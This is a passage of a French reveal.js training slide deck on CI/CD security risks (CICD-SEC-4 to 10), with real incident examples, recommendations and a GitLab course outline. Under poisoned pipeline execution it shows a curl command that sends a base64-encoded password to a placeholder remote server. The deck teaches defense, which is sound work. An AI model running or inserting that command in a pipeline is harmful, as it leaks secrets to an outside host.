+    - npm audit --audit-level=high
+  only:
+    - master
+```
+
+--- 
+
+## CICD-SEC-4: Poisoned Pipeline Execution (PPE)
+Un attaquant crée une nouvelle branche distante dans le référentiel, dans laquelle il met à jour le fichier de configuration du pipeline avec des commandes malveillantes destinées à accéder aux informations d'identification ou execution de code.
+
+> Exemple sur gitlab 
+
+Même sans avoir accès au retour des ci/cd, on peut envoyer les informations sur serveur distant.
+```
+curl -d creds="$(echo $PASSWORD | base64) http://monadresse.op
+```
+
+---
+
+### Recommandations
+- Assurez-vous que les pipelines exécutant du code non révisé sont exécutés sur des nœuds isolés, non exposés à des secrets et à des environnements sensibles.
+
+---
+
+## CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
+
+Abus de l'autorisation accordée au pipeline pour se déplacer latéralement à l'intérieur ou à l'extérieur du système CI/CD. 
+
+Exmple : Codecov, un outil de couverture de code populaire utilisé dans le CI, a été compromis et utilisé pour voler des variables d'environnement dans les builds.
+- https://about.codecov.io/security-update/
+
+
+--- 
+
+### Recommandations
+
+- Assurez-vous que les secrets utilisés dans les systèmes CI/CD sont définis de manière à permettre à chaque pipeline et étape d'avoir accès uniquement aux secrets dont ils ont besoin.
+---
+
+## CICD-SEC-6 Hygiène insuffisante des informations d'identification
+
+Les secrets sont souvent transmis involontairement au SCM. Cela les rend accessibles à tout utilisateur disposant d'une autorisation de lecture sur le référentiel.
+
+Une erreur courante lorsque l'on tente d'atténuer le problème consiste à supprimer le secret de la branche dans laquelle il a été validé, alors que le secret reste exposé dans les validations précédentes, qui sont toujours accessibles à toute personne ayant accès au répo.
+
+---
+**Exemple :** 
+
+Samsung a exposé des secrets trop permissifs dans les référentiels publics GitLab.
+- https://techcrunch.com/2019/05/08/samsung-source-code-leak/
+
+---
+
+Exemple : 
+```
+$ git clone http://40.113.34.255:3000/Wonderland/duchess.git
+$ cd duchess
+$ gitleaks detect -v
+```
+
+### Recommandations 
+
+- Si leak il y a chnager le token/secret
+- Mettre en place secret_dtection
+---
+## CICD-SEC-7 : Configuration du système non sécurisée
+Les risques de configuration non sécurisée du système proviennent de failles dans les paramètres de sécurité, 
+la configuration et le renforcement des différents systèmes à travers le pipeline (par exemple, SCM, CI, référentiel d'artefacts), 
+ce qui entraîne souvent des « fruits à portée de main » pour les attaquants cherchant à étendre leur présence dans l'environnement.
+
+---
+Exemple :
+
+- Porte dérobée implantée dans le référentiel PHP git. Les attaquants ont poussé le code malveillant non révisé directement vers la branche principale de PHP, ce qui a finalement abouti à la diffusion d'une version formelle de PHP à tous les utilisateurs de PHP. L’attaque provient probablement d’une compromission du serveur git auto-maintenu de PHP.
+https://news-web.php.net/php.internals/113981
+
+---
+
+- La compromission du système de build SolarWinds, utilisé pour propager des logiciels malveillants via SolarWinds à 18 000 organisations.
+https://sec.report/Document/0001628280-20-017451/#swi-20201214.htm
+
+---
+
+- Le code source de Nissan a été divulgué après qu'une instance Bitbucket autogérée soit restée accessible depuis Internet avec les informations d'identification par défaut.
+https://www.zdnet.com/article/nissan-source-code-leaked-online-after-git-repo-misconfiguration/
+
+---
+
+- Un serveur GitLab autogéré du gouvernement de l'État de New York a été exposé à Internet, permettant à quiconque de s'inscrire et de se connecter au système, qui stockait des secrets sensibles.
+https://techcrunch.com/2021/06/24/an-internal-code-repo-used-by-new-york-states-it-office-was-exposed-online/
+
+---
+
+### Recommandations 
+- Assurez-vous que l’accès réseau aux systèmes est conforme au principe du moindre accès.
+- Branche protégée  
+
+---
+
+## CICD-SEC-8 : Utilisation non gouvernée de services tiers
+Comprommissions de service tiers pour viser une cible
+
+---
+
+Exemple : 
+- Les attaquants compromettent le compte utilisateur GitHub d'un ingénieur DeepSource (une plateforme d'analyse statique). 
+À l'aide du compte compromis, ils obtiennent les autorisations de l'application DeepSource GitHub,
+leur accordant un accès complet à la base de code de tous les clients DeepSource qui ont installé l'application GitHub compromise.  
+  
+https://discuss.deepsource.io/t/security-incident-on-deepsource-s-github-application/131  
+
+---
+- Les attaquants accèdent à la base de données de Waydev, une plateforme d'analyse Git, volant les jetons GitHub et GitLab OAuth de leurs clients.  
+
+https://changelog.waydev.co/github-and-gitlab-oauth-security-update-dw98s
+
+---
+### Recommandations 
+- Minimiser l'utilisations de services tiers
+- Examinez périodiquement tous les tiers intégrés et supprimez ceux qui ne sont plus utilisés.
+
+---
+
+### CICD-SEC-9 : Validation incorrecte de l'intégrité des artefacts
+
+Les risques de validation inappropriée de l’intégrité des artefacts permettent à un attaquant 
+ayant accès à l’un des systèmes du processus CI/CD de pousser du code ou des artefacts malveillants 
+µ(bien qu’apparemment inoffensifs) dans le pipeline, en raison de mécanismes insuffisants pour garantir la validation du code et des artefacts.
+
+---
+
+
+**Exemple :**
+
+- Les attaquants compromettent le serveur de build Webmin et ajoutent une porte dérobée à l'un des scripts de l'application. La porte dérobée a continué à persister même après la mise hors service du serveur de build compromis, car le code avait été restauré à partir d'une sauvegarde locale, plutôt que du système de contrôle de source. Les utilisateurs de Webmin ont été sensibles au RCE via une attaque de la chaîne d'approvisionnement pendant plus de 15 mois, jusqu'à ce que la porte dérobée soit supprimée.
+
+https://www.webmin.com/exploit.html
+
+---
+
+### Recommandations 
+Logiciel de vérification d'artefacts : l'utilisation d'outils de signature et de vérification du code et des artefacts permet d'empêcher la livraison de logiciels non vérifiés dans le pipeline. Des exemples de tels projets sont in-toto , SLSA et Sigstore , tous faisant partie de la Linux Foundation.
+
+--- 
+
+## CICD-SEC-10: Insufficient Logging and Visibility
+
+Logs insuffisants permettent à un adversaire de mener des activités malveillantes au sein de l'environnement CI/CD sans être détecté pendant aucune phase de la chaîne de destruction de l'attaque, y compris l'identification des TTP (techniques, tactiques et procédures) de l'attaquant dans le cadre de tout post-incident. 
+
+--- 
+
+### Recommandations
+Implémenter un monitoring qui veille à detecter toutes les attaques sur les applications web. 
+ex CrowdStrike 
+
+
+# DAS-CI-CD
+
+## Jour 1 : Automatisation Avancée avec GitLab CI/CD
+
+
+### Révision rapide de GitLab CI/CD et de ses concepts de base.
+- Concepts de base de GitLab CI/CD (30 minutes)
+   - Pipeline
+   - Jobs et stage
+   - Runners
+
+### Création d'un pipeline CI/CD pour un projet NestJS.
+
+
+- Configuration des tests automatisés pour un projet Angular.
+
+- Création d'un pipeline de déploiement avec Docker dans un environnement DEV.
+
+## Jour 2 : Personnalisation et Bonnes Pratiques
+
+- Personnalisation des runners GitLab pour répondre aux besoins spécifiques du projet.
+
+- Planification avancée (scheduling) pour les tests E2E.
+
+**Après-midi : Sécurité et Bonnes Pratiques**
+
+- Configuration de la sécurité du référentiel GitLab, y compris les branches protégées et les revues de code.
+
+- Bonnes pratiques en CI/CD, discussions sur la manière d'optimiser les pipelines.
+
+- Pentest d’un pipeline vulnérable.
+
+</textarea></section>
+			</div>
+		</div>
+
+		<script src="dist/reveal.js"></script>
+		<script src="plugin/notes/notes.js"></script>
+		<script src="plugin/markdown/markdown.js"></script>
+		<script src="plugin/highlight/highlight.js"></script>
+		<script src="plugin/math/math.js"></script>
+		<script>
+			// More info about initialization & config:
+			// - https://revealjs.com/initialization/
+			// - https://revealjs.com/config/
+Reveal.initialize({
+controls : false,
+markdown : {smartypants: true},
+				hash: true,
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes, RevealMath ]
+			});
+		</script>
+	</body>
+</html>
